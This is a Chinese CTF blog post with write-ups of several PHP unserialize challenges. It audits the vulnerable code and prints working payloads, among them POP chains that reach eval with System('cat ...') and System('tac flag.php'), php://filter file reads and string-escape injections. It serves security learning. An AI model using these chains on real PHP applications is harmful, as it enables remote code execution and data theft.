---
title: php
date: '2025-05-08 19:03:44'
updated: '2025-05-08 23:50:43'
permalink: /post/php-z1tprsn.html
comments: true
toc: true
---



# php

### 例题

#### [极客大挑战 2019]PHP

查看页面都没找到东西，提示有一个备份网站

> 提示说备份时，一般是指备份网站源码，通常需要获取到备份文件然后进行分析
>
> 网站备份一般都会依赖一些第三方软件，将网站内容打包成压缩包放到网站的某个目录中

所以要用dirsearch去扫

```bash
dirsearch -u http://70cab44f-a76f-46a6-afab-c43983becf33.node5.buuoj.cn:81/ --delay 0.1 -t 1
```

因为buu限制了访问，所以扫太快扫不出来，全部429了，所以延迟一下，大概扫不到10分钟

![image-20250228194233945](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250203133353606.png)

找到一个flag.php，但是没东西，还有www.zip可以下载下来，然后就是php代码审计

先看到了index.php中包含了class.php，并且获取了一个get的参数select

```php
<?php
include 'class.php';
$select = $_GET['select'];
$res=unserialize(@$select);
?>
```

> ​`unserialize`​是用于反序列化数据，将处理过的字符串转换回原始的php变量，所以这里应该传入的是序列化的数据
>
> ​`include`​在php中是引入并执行另一个php文件，相当于把被包含的文件复制到当前include所在的位置

```php
<?php
include 'flag.php';

error_reporting(0);

class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();          
        }
    }
}
?>
```

> 这里定义了一个类，有几个魔术方法
>
> ​`__construct()`​：这个应该是传入用户名和密码的  
> 这个当对象被创建时自动执行
>
> ​`__wakeup()`​：这个直接修改了用户名为guest  
> 反序列化后自动执行
>
> ​`__destruct()`​：这个是一个判断，如果用户名和密码是admin和100就能获取到flag  
> 当对象被销毁时执行
>
> 这里有个wakeup的方法会导致在反序列化时修改名字

访问控制符：`public`​、`porotected`​、`private`​

public：可以在任何地方被访问，在序列化后会变成`属性名`​  
protected：可以被自身及其子类和父类访问`+*+属性名`​  
private：只能在定义的类中访问`+类名+属性名`​

* 加号代表空字符

```php
<?php
class People{
    public $name;
    protected $gender;
    private $age;
    public function __construct(){
        $this->name = 'marin';
        $this->gender = 'male';
        $this->age = '18';
    }
}    
$a = new People();    
echo serialize($a)
?>
```

```
O:6:"People":3:{s:4:"name";s:5:"marin";s:9:" * gender";s:4:"male";s:11:" People age";s:2:"18";}
```

> ​`O`​代表对象，`6`​代表对象名长度为6，`People`​为对象名，`3`​代表有3个参数
>
> ​`{}`​里是参数的key和value
>
> ​`s`​代表strng对象，`4`​代表长度，`name`​代表key，后面同理  
> 不同的数据类型有不同的字符

这里就行先构造序列化的payload

```php
<?php
 
class Name{
    private $username = '123';
    private $password = '456';
 
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
}
$a = new Name('admin', 100);
var_dump(serialize($a));
 
?>
```

```
O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
```

但是又会有一个`__wakeup()`​方法会导致无法获取flag  
在序列化的字符串中的**属性值个数**大于**属性个数**就会导致反序列化异常，从而绕过这个方法

所以最后payload是

```
?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

成功获取flag

#### [ZJCTF 2019]NiZhuanSiWei

这里给了php代码，要进行审计

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

这里有三个参数，对应的三层

​`file_get_contents()`​是从文件中读取内容，将读取到的内存作为字符串传入

所以要写入数据到text参数中，这里使用data伪协议

```
?text=data://text/plain,welcome to the zjctf
```

然后根据提示要获取到useless.php文件，使用php://filter获取

```
?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php
```

获取到数据

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

这里利用php代码被包含时会被执行，所以payload要修改为

```
?text=data://text/plain,welcome to the zjctf&file=useless.php
```

这样就相当于将useless.php插入到原本的php文件中

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        class Flag{  //flag.php  
            public $file;  
            public function __tostring(){  
            if(isset($this->file)){  
                echo file_get_contents($this->file); 
                echo "<br>";
            return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

然后在想如何触发这个__tostring()方法，想到下面的password，将这个password变成序列化的字符串，进行一次反序列化之后就变成了Flag对象，并且将file参数修改为flag.php之后，在echo时可以触发  \_\_tostring()方法将flag.php的内容echo出来

这时候本地进行序列化

```php
<?php  

class Flag{  //flag.php  
    public $file='flag.php';  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
$a = new Flag();
echo serialize($a);
?>  
```

得到

```
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

最后的payload

```
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

![image-20250314195351655](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250314195351655.png)

这个就代表成功了，查看源代码得到flag

#### [网鼎杯 2020 青龙组]AreUSerialz

这题有几种做法，看到了都记录一下

法1：（最开始我自己做的方法）

开始直接拿到代码进行审计

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

看着挺长，但是仔细看一下就可以去掉一些部分

```php
public function process() {
    if($this->op == "1") {
        $this->write();
    } else if($this->op == "2") {
        $res = $this->read();
        $this->output($res);
    } else {
        $this->output("Bad Hacker!");
    }
}

private function read() {
    $res = "";
    if(isset($this->filename)) {
        $res = file_get_contents($this->filename);
    }
    return $res;
}

private function output($s) {
    echo "[Result]: <br>";
    echo $s;
}
```

> 最主要的方法，读取flag就靠这个，要求op参数为2，用的弱等于
>
> 然后跳转到`read`​和`output`​就可以读取flag.php的内容

```php
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
private function output($s) {
    echo "[Result]: <br>";
    echo $s;
}
```

> 限制，要求payload的序列化字符串要在32到125之间，一开始妹想到这个有什么用，字符应该都在这附近
>
> 后面怎么都出不来，查的wp，发现`protected`​方法序列化中的`%00`​在这里会被视为 0 的ascii值，所以要绕过的是这个，用`\00`​来绕过，因为这两个代表的都是`NULL`​，而`\00`​代表的是十六进制的`NULL`​  
> 因为是十六进制，所以这里还要将序列化后的对象修改掉，原本是s类型，代表字符串类型，而S为十六进制字符串类型，所以要将这个修改为S

```php
function __destruct() {
    if($this->op === "2")
        $this->op = "1";
    $this->content = "";
    $this->process();
}
```

> 这个就是进入`process()`​的函数，因为代码结束时会自动触发
>
> 这里还有一个强比较，如果为2就改为1，因为后面是弱比较字符串，所以只要为数值类型的2就可以绕过这个

最后的代码为，再加上`\00`​

```php
<?php
class FileHandler {

    protected $op= 2;
    protected $filename="flag.php";
    protected $content="";

}
$a = new FileHandler();
$s = serialize($a);
$s = str_replace('s','S',$s);
echo $s;
?>
```

payload

```
?str=O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:0:"";}
```

法2：  
这个不懂，查wp时看到的

* php>7.1 版本对类属性的检测不严格 (对属性类型不敏感)

所以将protected修改为public就行

```
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```

法3：

利用include()文件包含用php://filter来读取flag.php

```php
<?php
class FileHandler {

    public $op= 2;
    public $filename="php://filter/convert.base64-encode/resource=flag.php";
    public $content="";
}
$a = new FileHandler();
$s = serialize($a);
echo $s;


?>
```

```
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:52:"php://filter/convert.base64-encode/resource=flag.php";s:7:"content";s:0:"";}
```

得到

```
PD9waHAgJGZsYWc9J2ZsYWd7MDhjOTVhODEtOTM2MS00MjZjLWJiNjctMDkxNzU4OThhY2QzfSc7Cg==
<?php $flag='flag{08c95a81-9361-426c-bb67-09175898acd3}';
```

#### [SWPUCTF 2021 新生赛]pop

```php
<?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);

?>
```

代码审计，看这里的逻辑

1. 反序列化触发w22m中的`__destruct()`​方法
2. 然后echo触发w33m中的 __toString()方法
3. 通过修改w33m中的w00m和w22m参数，触发w44m中的Getflag方法
4. 最后修改w44m中的admin和passwd通过检测，获取flag

这里学了如何构造反序列化链，也就是pop链  
这个就是利用魔术方法在里面进行多次跳转获取数据

```php
<?php

class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';
}

class w33m{
    public $w00m;
    public $w22m = 'Getflag';
    public function __construct(){
        $this->w00m = new w44m();
    }
}

class w22m{
    public $w00m;
    public function __construct(){
        $this->w00m = new w33m();
    }
}

$w22m = new w22m();
echo serialize($w22m);
?> 

```

最后学到用这个来构造pop链

__construct()：在创建一个对象时会被触发，比如new

所以是在`new w22m`​时，触发了`w22m`​的`__construct`​方法，然后创建了`w33m`​对象，最后触发了`w33m`​的`__construct`​方法，创建了`w44m`​对象

```
O:4:"w22m":1:{s:4:"w00m";O:4:"w33m":2:{s:4:"w00m";O:4:"w44m":2:{s:11:"%00w44m%00admin";s:4:"w44m";s:9:"%00*%00passwd";s:5:"08067";}s:4:"w22m";s:7:"Getflag";}}
```

得到flag

#### [NISACTF 2022]babyserialize

也是构造pop链的一道题，看源码

```php
<?php
include "waf.php";
class NISA{
    public $fun="show_me_flag";
    public $txw4ever;
    public function __wakeup()
    {
        if($this->fun=="show_me_flag"){
            hint();
        }
    }

    function __call($from,$val){
        $this->fun=$val[0];
    }

    public function __toString()
    {
        echo $this->fun;
        return " ";
    }
    public function __invoke()
    {
        checkcheck($this->txw4ever);
        @eval($this->txw4ever);
    }
}

class TianXiWei{
    public $ext;
    public $x;
    public function __wakeup()
    {
        $this->ext->nisa($this->x);
    }
}

class Ilovetxw{
    public $huang;
    public $su;

    public function __call($fun1,$arg){
        $this->huang->fun=$arg[0];
    }

    public function __toString(){
        $bb = $this->su;
        return $bb();
    }
}

class four{
    public $a="TXW4EVER";
    private $fun='abc';

    public function __set($name, $value)
    {
        $this->$name=$value;
        if ($this->fun = "sixsixsix"){
            strtolower($this->a);
        }
    }
}

if(isset($_GET['ser'])){
    @unserialize($_GET['ser']);
}else{
    highlight_file(__FILE__);
}

//func checkcheck($data){
//  if(preg_match(......)){
//      die(something wrong);
//  }
//}

//function hint(){
//    echo ".......";
//    die();
//}
?>
```

看到了hint函数，要进入只需要构造最简单的序列化就行

```
?ser=O:4:"NISA":2:{s:3:"fun";s:12:"show_me_flag";s:8:"txw4ever";N;}
```

获取到hint

![image-20250225151042871](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250227180546224.png)

然后进行审计，一段段来

```php
class NISA{
    public $fun="show_me_flag";
    public $txw4ever;
    public function __wakeup()
    {
        if($this->fun=="show_me_flag"){
            hint();
        }
    }

    function __call($from,$val){
        $this->fun=$val[0];
    }

    public function __toString()
    {
        echo $this->fun;
        return " ";
    }
    public function __invoke()
    {
        checkcheck($this->txw4ever);
        @eval($this->txw4ever);
    }
}
```

> 这个类里面，一眼就能看到`eval`​，那这个大概率就是最后一步
>
> ​`__invoke`​：使用调用函数的方法调用一个对象时就会触发
>
> 其他的几个方法都没什么用

```php
class TianXiWei{
    public $ext;
    public $x;
    public function __wakeup()
    {
        $this->ext->nisa($this->x);
    }
}
```

> ​`__wakeup`​：在反序列化时就会调用这个函数
>
> 这个调用`ext`​对象的`nisa`​函数，但是全文都没有这个函数，猜测是用来触发`__call`​函数的

```php
class Ilovetxw{
    public $huang;
    public $su;

    public function __call($fun1,$arg){
        $this->huang->fun=$arg[0];
    }

    public function __toString(){
        $bb = $this->su;
        return $bb();
    }
}
```

> ​`__call`​：在调用一个不可访问的方法时触发
>
> ​`__toString`​：类被当成字符串时触发
>
> 这里的`__call`​函数可以触发`__set`​函数
>
> ​`__toString`​函数可以触发`__invoke`​函数

```php
class four{
    public $a="TXW4EVER";
    private $fun='abc';

    public function __set($name, $value)
    {
        $this->$name=$value;
        if ($this->fun = "sixsixsix"){
            strtolower($this->a);
        }
    }
}
```

> ​`__set`​：在调用一个不可访问的属性时触发
>
> 这里的`strtolower`​方法可以触发`__toString`​方法

整理一下顺序

1. ​`TianXiWei`​的`__wakeup`​触发`Ilovetxw`​的`__call`​函数，所以`ext`​要设置为`Ilovetxw`​对象
2. ​`Ilovetxw`​的`__call`​函数触发`four`​的`__set`​
3. 通过`four`​的`__set`​的`strtolower`​触发`Ilovetxw`​的`__toString`​
4. ​`Ilovetxw`​的`__toString`​的`$bb()`​触发最后`NISA`​的`__invoke`​

```php
<?php
class NISA{
    public $fun; // 切换绕过hint
    public $txw4ever="System('cat /fllllllaaag ');";
}

class TianXiWei{
    public $ext;   // Ilovetxw
    public $x;
}

class Ilovetxw{
    public $huang;   // four
    public $su;      // NISA
}

class four{
    public $a="TXW4EVER";
    private $fun='abc';
}

$a = new TianXiWei();
$b = new Ilovetxw();
$c = new four();
$d = new NISA();


$a->ext = $b;
$b->huang = $c;
$b->su = $d;
$c->a = $b;

echo urlencode(serialize($a));
?>
```

但是最后没感觉到这个waf限制了什么，url加密就过了

```
O:9:"TianXiWei":2:{s:3:"ext";O:8:"Ilovetxw":2:{s:5:"huang";O:4:"four":2:{s:1:"a";r:2;s:9:"fourfun";s:3:"abc";}s:2:"su";O:4:"NISA":2:{s:3:"fun";N;s:8:"txw4ever";s:28:"System('cat /fllllllaaag ');";}}s:1:"x";N;}
```

成功得到flag

看讨论看到一个很帅的思路

```php
public function __wakeup()
    {
        if($this->fun=="show_me_flag"){
            hint();
        }
    }
```

这个函数用的是弱比较，php的弱比较有个特性，会将两边的自动转换为同一类型后进行比较，所以我们将fun定义为一个对象，触发弱比较就可以触发__toString函数，所以可以用一个很短的链完成

```php
<?php
class NISA{
    public $fun; // Ilovetxw
    public $txw4ever="System('cat /fllllllaaag ');";
}

class Ilovetxw{
    public $huang;   
    public $su;      // NISA
}

$a = new NISA();
$b = new Ilovetxw();

$a->fun = $b;
$b->su = $a;

echo urlencode(serialize($a));
?>
```

#### [UUCTF 2022 新生赛]ezpop

这题考了字符串逃逸和pop链

先查pop链

```php
<?php
//flag in flag.php
error_reporting(0);
class UUCTF{
    public $name,$key,$basedata,$ob;
    function __construct($str){
        $this->name=$str;
    }
    function __wakeup(){
    if($this->key==="UUCTF"){
            $this->ob=unserialize(base64_decode($this->basedata));
        }
        else{
            die("oh!you should learn PHP unserialize String escape!");
        }
    }
}
class output{
    public $a;
    function __toString(){
        $this->a->rce();
    }
}
class nothing{
    public $a;
    public $b;
    public $t;
    function __wakeup(){
        $this->a="";
    }
    function __destruct(){
        $this->b=$this->t;
        die($this->a);
    }
}
class youwant{
    public $cmd;
    function rce(){
        eval($this->cmd);
    }
}
$pdata=$_POST["data"];
if(isset($pdata))
{
    $data=serialize(new UUCTF($pdata));
    $data_replace=str_replace("hacker","loveuu!",$data);
    unserialize($data_replace);
}else{
    highlight_file(__FILE__);
}
?>
```

这里的反序列化是在UUCTF的`__wakeup`​中，所以pop链是在另外三个类中

```php
class output{
    public $a;
    function __toString(){
        $this->a->rce();
    }
}
class nothing{
    public $a;
    public $b;
    public $t;
    function __wakeup(){
        $this->a="";
    }
    function __destruct(){
        $this->b=$this->t;
        die($this->a);
    }
}
class youwant{
    public $cmd;
    function rce(){
        eval($this->cmd);
    }
}
```

反推链，最后是触发`youwant`​的`rce`​函数，用`output`​的`__toString`​触发rce，要触发`__toString`​，就要使用`nothing`​的`__destruct`​中的`die`​触发，因为`die`​会打印里面的东西

这里有个地方，在__wakeup时会把a给置空（在这里卡了好久还没发现

让a指向b的地址，然后在__destruct将t赋给b，这样a就能指向output了

```php
class output{
    public $a;    // youwant
     function __toString(){
         $this->a->rce();
     }
}
class nothing{
    public $a;   // output
    public $b;
    public $t;
    function __wakeup(){
         $this->a="";
    }
    function __destruct(){
         $this->b=$this->t;
         die($this->a);
    }
}
class youwant{
    public $cmd = "System('ls');";
    function rce(){
         eval($this->cmd);
    }
}

$a = new output();
$b = new nothing();
$c = new youwant();

$a->a = $c;
$b->a = &$b->b;   // 让a指向b的地址
$b->t = $a;

echo base64_encode(serialize($b));
```

然后考的就是字符串逃逸，参考[PHP反序列化-字符逃逸 - Sayo-NERV - 博客园](https://www.cnblogs.com/Sayo-/p/15164265.html)

```php
class UUCTF{
    public $name,$key,$basedata,$ob;
    function __construct($str){
        $this->name=$str;
    }
    function __wakeup(){
    if($this->key==="UUCTF"){
            $this->ob=unserialize(base64_decode($this->basedata));
        }
        else{
            die("oh!you should learn PHP unserialize String escape!");
        }
    }
}

$pdata=$_POST["data"];
if(isset($pdata))
{
    $data=serialize(new UUCTF($pdata));
    $data_replace=str_replace("hacker","loveuu!",$data);
    unserialize($data_replace);
}else{
    highlight_file(__FILE__);
}

```

这里的反序列化和之前不一样，是在他的php中，完成的，我们传入的数据只能修改UUCTF的str参数，无法修改，但是这里有一个str_replace，可以看到替换后的字符串多了一个字符

> 漏洞成因：反序列化都是以`";}`​结尾的，只要读取到了这个就会舍弃后面的内容  
> 并且在反序列化时，php会根据s指定的字符串长度去读取后面的字符
>
> 原理：
>
> ```php
> <?php
> class marin{
> public $name = "limbo";
> public $key = "love";
> }
>
> $a = new marin();
> $b = serialize($a);
>
> $c = str_replace("limbo","hacker",$b);
>
> echo $c;
> ?>
> ```
>
> ```php
> O:5:"marin":2:{s:4:"name";s:5:"limbo";s:3:"key";s:4:"love";}
>
> O:5:"hacker":2:{s:4:"name";s:5:"hacker";s:3:"key";s:4:"love";}
> ```
>
> 这里`limbo`​被替换成`hacker`​之后，就逃逸了一个字符，这时候反序列化，name的值会是`hacke`​
>
> 那如果我们将`name`​的值在后面加上反序列化后的字符串，就能控制它的读取，我们在`name`​的后面加上这一段内容，长度是27，我们就需要逃逸27个字符
>
> ```
> ";s:3:"key";s:7:"love123";}
> ```
>
> 我们就要在前面加上27个`limbo`​
>
> ```
> limbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbo";s:3:"key";s:7:"love123";}
> ```
>
> ```php
> <?php
> class marin{
> public $name = 'limbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbolimbo";s:3:"key";s:7:"love123";}';
> public $key = "love";
>
> }
>
> $a = new marin();
> $b = serialize($a);
>
> $c = str_replace("limbo","hacker",$b);
>
> echo $c;
> $d = unserialize($c);
> echo $d->key;
>
> ?>
> ```
>
> 然后就能输出
>
> ```php
> O:5:"marin":2:{s:4:"name";s:162:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:3:"key";s:7:"love123";}";s:3:"key";s:4:"love";}
> ```
>
> 可以看到长度是name的s读取的长度是162，就是hacker的长度，刚好读取到我们加入的内容中，然后继续读取我们的内容进行反序列化

```php
class UUCTF{
    public $name='1';
    public $key= "UUCTF";
    public $basedata = "Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJTeXN0ZW0oJ2xzJyk7Ijt9fX0=";
    public $ob= "1";
}
```

我们将得到的内容加入进去

```php
O:5:"UUCTF":4:{s:4:"name";s:1:"1";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:164:"Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJTeXN0ZW0oJ2xzJyk7Ijt9fX0=";s:2:"ob";s:1:"1";}
```

将需要的后半段提取出来，长度是230，就加上230个hacker

```
hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:164:"Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEzOiJTeXN0ZW0oJ2xzJyk7Ijt9fX0=";s:2:"ob";s:1:"1";}
```

![image-20250220150332103](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250228194233945.png)

然后读取flag就行

这题不知道为什么不能用cat，用的tac查的flag，最后的payload

```
hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:176:"Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJTeXN0ZW0oJ3RhYyBmbGFnLnBocCcpOyI7fX19";s:2:"ob";s:1:"1";}
```

#### [第五空间 2021]pklovecloud

这题给我做的蒙蒙的

先看代码

```php
<?php  
include 'flag.php';
class pkshow 
{  
    function echo_name()     
    {          
        return "Pk very safe^.^";      
    }  
} 

class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new pkshow;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    }  
}  

class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}  

if (isset($_GET['pks']))  
{
    $logData = unserialize($_GET['pks']);
    echo $logData; 
} 
else 
{ 
    highlight_file(__file__); 
}
?>
```

​`pkshow`​这个类是没什么用的，不管  
​`acp`​类有一个 `__toString`​，并且还调用 `cinder`​ 属性的 `echo_name`​ 的方法  
​`ace`​类中有 `file_get_contents`​ 这个就是最后一步

传入pks参数会被反序列化，并且还会 echo 触发 `__toString`​ 开始构造

```php
class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}  
```

这里中间卡了挺久，因为在ace类中还有一个比较，并且不知道 `heat`​ 属性的值，不知道怎么绕，但是一开始传入了一个什么值都没有得值

```php
O:3:"acp":3:{s:9:"%00*%00cinder";O:3:"ace":3:{s:8:"filename";N;s:9:"openstack";N;s:6:"docker";N;}s:7:"neutron";N;s:4:"nova";N;}
```

![image-20250321105552696](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250321105552696.png)

可以发现已经绕过了这个比较，虽然不知道为什么，就接着做下去了

```php
<?php  
class acp 
{   
    public $cinder;  
    public $neutron;
    public $nova;
}  

class ace
{    
    public $filename = "flag.php";     
    public $openstack;
    public $docker; 
}  

$a = new acp();
$b = new ace();

$a->cinder = $b;

echo (serialize($a));
?>
```

```php
O:3:"acp":3:{s:9:"%00*%00cinder";O:3:"ace":3:{s:8:"filename";s:8:"flag.php";s:9:"openstack";N;s:6:"docker";N;}s:7:"neutron";N;s:4:"nova";N;}
```

![image-20250321105651069](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250321105651069.png)

读到了提示，最后目录穿越一下就拿到flag了

```php
